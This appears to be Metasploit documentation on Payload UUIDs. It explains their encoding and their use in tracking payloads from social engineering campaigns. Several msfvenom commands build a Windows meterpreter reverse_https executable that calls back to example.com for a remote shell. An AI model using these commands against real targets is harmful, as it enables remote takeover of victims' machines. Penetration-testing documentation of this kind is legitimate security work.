In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The [source code comments](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/uuid.rb) go into more detail.

In the case of HTTP payloads, the 16-byte UUID value is encoded in [base64url](https://tools.ietf.org/html/rfc4648#section-5) format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established.

The goal of Payload UUIDs is three-fold:
 * Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing.
 * Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.
 * Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.

Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the ```PayloadUUIDRaw``` option. This option takes a 8-byte hex string, such as "0011223344556677". For example:
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
```

Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
```


Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadUUIDTracking``` option is set to ```true```. Setting this option causes a new entry to be created in ```~/.msf4/payloads.json``` when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the ```PayloadUUIDName```. The example below will create a new registered payload with a custom name:

```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe

$ cat ~/.msf4/payloads.json 
{
  "09e642e7c0fc235a": {
    "arch": "x86",
    "platform": "windows",
    "timestamp": 1435276808,
    "payload": "payload/windows/meterpreter/reverse_https",
    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"example.com","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
    "name": "EmailCampaign20150101",
    "urls": [
  "/CeZC58D8I1qT_JL9xnAF9A7AvWT8e_QNB3MWqY8nvNRN82crZWqoXKr25Ej7XR87IbnnwUwC2bwG9LIIh1tVUTMf1fwag0F7m6mk0iv-u4M9h40elV0aPD7d3genb1ofVEwKV-L2SXG-DYXJnkiH7gPeA_rCTHHfAn-Ayl2ETblQp5lVH-12tZjVIFGWVfFEDMWYnAKBzKmb4jMcrdTQP2u_fM"
]
}
}
```

